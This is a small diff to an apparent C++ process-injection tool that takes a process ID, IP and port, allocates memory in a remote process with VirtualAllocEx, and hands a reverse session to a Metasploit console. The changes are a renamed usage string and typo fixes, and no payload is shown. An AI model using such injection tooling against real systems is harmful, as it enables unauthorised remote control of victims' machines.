@@ -58,7 +58,7 @@ int main(int argc, char** argv)
     BOOL ret = FALSE;
 
     if (argc != 4) {
-        std::cout << "Usage: revshell <pid> <ip> <port>\n";
+        std::cout << "Usage: revmet <pid> <ip> <port>\n";
         exit(1);
     }
 
@@ -109,7 +109,7 @@ int main(int argc, char** argv)
         std::cout << "alloc'ed: " << m << "\n";
     }
     else {
-        std::cout << "VirtualALlocEx failed\n";
+        std::cout << "VirtualAllocEx failed\n";
         goto bye;
     }
 
@@ -131,7 +131,7 @@ int main(int argc, char** argv)
         goto bye;
     }
 
-    std::cout << "Check you Metasploit console :)\n";
+    std::cout << "Check your Metasploit console :)\n";
 
 bye:
     CloseHandle(h);
